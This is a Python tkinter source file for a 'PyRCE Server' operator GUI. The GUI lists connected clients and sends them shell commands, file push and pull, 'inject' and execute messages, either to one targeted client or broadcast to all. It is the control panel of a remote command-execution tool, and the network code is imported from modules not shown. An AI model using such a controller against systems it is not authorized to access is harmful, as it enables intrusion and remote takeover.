import tkinter as tk
from datetime import datetime
from enum import Enum

import config
from src.core.message import Message, MessageType
from src.core.observer import RCEEventObserver
from src.server.rce_server import RCEServer


class ServerGUI(RCEEventObserver):
    class TextColors(Enum):
        FORREST_GREEN = "forestgreen"
        DIM_GRAY = "dimgray"
        RED = "red4"
        PURPLE = "mediumorchid"
        BLACK = "black"

    __TIME_FORMAT = "%Y-%m-%d %H:%M:%S"

    def __init__(self, server: RCEServer):
        self.__server = server
        self.__server.add_observer(self)
        self.__target_client = None

        # ServerGUI
        self.main_window = tk.Tk()
        self.main_window.title("RCE Server")
        self.main_window.geometry("1280x720")
        self.main_window.resizable(False, False)
        self.main_window.protocol("WM_DELETE_WINDOW", self.close_windows)

        self.header = tk.Frame(self.main_window)
        self.content = tk.Frame(self.main_window)
        self.content_top = tk.Frame(self.content)
        self.content_bottom = tk.Frame(self.content)

        self.header.pack(side=tk.TOP, fill=tk.X)
        self.content.pack(side=tk.TOP, fill=tk.BOTH, expand=True)
        self.content_top.pack(side=tk.TOP, fill=tk.BOTH, expand=True)
        self.content_bottom.pack(side=tk.BOTTOM, fill=tk.BOTH, expand=True)

        # Inputs
        self.server_start_button = tk.Button(self.header,
                                             text="Start", command=self.__start_rce_server, font=('', 12, 'bold'))
        self.server_stop_button = tk.Button(self.header,
                                            text="Stop", command=self.__stop_rce_server, font=('', 12, 'bold'))
        self.message_input = tk.Entry(self.content_bottom, font=('', 10, 'bold'))
        self.send_message_button = tk.Button(self.content_bottom, text="Send Message", font=('', 12, 'bold'),
                                             command=self.__handle_message_input)

        # Outputs
        self.messages_area = tk.Text(self.content_top, font=('', 10, 'bold'))
        self.clients_list = tk.Listbox(self.content_top, font=('', 11, 'bold'))
        self.bind_events()

    def bind_events(self):
        self.message_input.bind("<Return>", lambda event: self.__handle_message_input())

    def close_windows(self):
        if self.__server.is_running():
            self.__server.stop()
        self.main_window.destroy()
        exit(0)

    def build_header(self):
        self.header.config(padx=10, pady=10)
        title = tk.Label(self.header, text="PyRCE Server", font=('', 16, 'bold'))
        title.pack(side=tk.LEFT)
        self.server_stop_button.pack(side=tk.RIGHT)
        self.server_start_button.pack(side=tk.RIGHT)

    def build_content(self):
        self.content.config(padx=10, pady=10)
        self.messages_area.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        self.clients_list.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        self.message_input.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.send_message_button.pack(side=tk.LEFT, fill=tk.X, expand=False)

    def build(self):
        self.build_header()
        self.build_content()
        self.main_window.mainloop()

    def __start_rce_server(self):
        if self.__server.start():
            self.server_start_button["state"] = "disabled"
            self.server_stop_button["state"] = "normal"

    def __stop_rce_server(self):
        if self.__server.stop():
            self.server_start_button["state"] = "normal"
            self.server_stop_button["state"] = "disabled"

    def __handle_message_input(self):
        if message_string := self.message_input.get().strip():
            self.__update_message_area(f"Server: {message_string}", color=ServerGUI.TextColors.BLACK)
            self.__clear_message_input()

            args = message_string.split(" ")
            command = args[0]
            if command.startswith("@"):
                self.__handle_command(command, args[1:])
                return

            # Send shell commands
            data = message_string.encode()
            message = Message(message_type=MessageType.CMD, data=data)
            if self.__target_client:
                self.__server.send_message_to_client(self.__target_client, message)
            else:
                self.__server.broadcast_message(message)

    def __handle_command(self, command: str, args: list):
        if command == "@target":
            target = ' '.join(args[1:])
            self.__target_client = target
            self.__update_message_area(f"Targeting {target}", color=ServerGUI.TextColors.FORREST_GREEN)
            self.__clear_message_input()
            return

        data = ' '.join(args).encode()
        if command == "@echo":
            message = Message(message_type=MessageType.ECHO, data=data)
        elif command == "@push":
            message = Message(message_type=MessageType.FILE_UPLOAD, data=data)
        elif command == "@pull":
            message = Message(message_type=MessageType.FILE_DOWNLOAD, data=data)
        elif command == "@inject":
            message = Message(message_type=MessageType.INJECT, data=data)
        elif command == "@exec":
            message = Message(message_type=MessageType.EXECUTE)
        else:
            self.__update_message_area(f"Unknown command: {command}", color=ServerGUI.TextColors.RED)
            self.__clear_message_input()
            return

        if self.__target_client:
            self.__server.send_message_to_client(self.__target_client, message)
        else:
            self.__server.broadcast_message(message)

    def __update_message_area(self, message: str, color: TextColors = TextColors.DIM_GRAY):
        """
        Updates the message area with a new message
        :param message: The message to be added
        :param color: The color to be used to display the message
        """
        message_format = f"{datetime.now().strftime(config.DATETIME_FORMAT)}: {message}"
        self.messages_area.config(state='normal')
        self.messages_area.tag_config(color.value, foreground=color.value)
        self.messages_area.insert(tk.END, message_format + '\n', color.value)
        self.messages_area.config(state='disabled')
        self.messages_area.see(tk.END)

    def __clear_message_input(self):
        self.message_input.delete(0, tk.END)

    def on_connect(self, client_address: str):
        self.__update_message_area(f"{client_address} connected", color=ServerGUI.TextColors.FORREST_GREEN)
        self.clients_list.insert(tk.END, client_address)
        self.clients_list.update()

    def on_disconnect(self, client_address: str):
        self.__update_message_area(f"{client_address} disconnected", color=ServerGUI.TextColors.FORREST_GREEN)
        for i in range(self.clients_list.size()):
            if self.clients_list.get(i) == client_address:
                self.clients_list.delete(i)
                break
        self.clients_list.update()

    def on_message(self, sender: str, message: str):
        self.__update_message_area(f"{sender}: {message}", color=ServerGUI.TextColors.DIM_GRAY)

    def on_error(self, error: str, prefix=""):
        self.__update_message_area(error, color=ServerGUI.TextColors.RED)

    def on_info(self, message: str, prefix=""):
        self.__update_message_area(message, color=ServerGUI.TextColors.FORREST_GREEN)

    def on_debug(self, message: str, prefix=""):
        self.__update_message_area(message, color=ServerGUI.TextColors.PURPLE)


if __name__ == "__main__":
    gui = ServerGUI(RCEServer("localhost", 6000))
    gui.build()
